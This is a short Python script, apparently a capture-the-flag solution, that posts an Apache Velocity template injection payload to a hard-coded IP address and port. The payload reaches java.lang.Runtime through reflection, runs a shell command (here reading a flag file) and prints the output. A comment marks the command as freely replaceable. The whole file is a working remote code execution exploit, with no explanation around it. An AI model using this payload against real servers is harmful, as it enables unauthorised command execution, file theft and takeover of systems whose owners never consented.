#!/usr/bin/python3
import requests

ip = "94.237.60.55"
port = 46477
url = f"http://{ip}:{port}/"

# Lệnh bạn muốn thực thi
command = "cat /flaga68e9e6704.txt"

payload = f"""
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($ex=$rt.getRuntime().exec("{command}"))
$ex.waitFor()
#set($in=$ex.getInputStream())
#set($scanner=$x.class.forName('java.util.Scanner').getConstructor($in.class).newInstance($in).useDelimiter("\\\\A"))
#if($scanner.hasNext())$scanner.next()#end
"""

try:
    print("[-] Sending payload...")
    req = requests.post(url, params={'text': payload}, timeout=15)
    
    print("\n[+] Response:")
    print(req.text.strip())

except requests.exceptions.RequestException as e:
    print(f"\n[!] An error occurred: {e}")